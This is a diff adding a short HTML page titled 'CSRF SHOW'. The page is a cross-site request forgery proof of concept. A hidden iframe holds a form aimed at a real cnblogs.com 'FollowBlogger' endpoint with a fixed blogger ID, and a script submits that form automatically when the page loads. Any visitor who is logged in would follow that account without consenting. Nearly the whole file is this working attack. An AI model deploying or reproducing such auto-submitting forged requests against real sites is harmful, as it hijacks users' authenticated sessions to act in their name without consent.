@@ -1,0 +1,19 @@
+<!DOCTYPE HTML>
+<html lang="en-US">
+<head>
+    <title>CSRF SHOW</title>
+</head>
+<body>
+<!--不嵌iframe会跳转-->
+<iframe style="display:none;">
+    <form  name="form1" action="http://www.cnblogs.com/mvc/Follow/FollowBlogger.aspx" method="post">
+        <input type="hidden" name="blogUserGuid" value="4e8c33d0-77fe-df11-ac81-842b2b196315"/>
+        <input type="submit" value>
+    </form>
+    <script>
+        console.log('tt')
+        document.forms.form1.submit();
+    </script>
+</iframe>
+</body>
+</html>
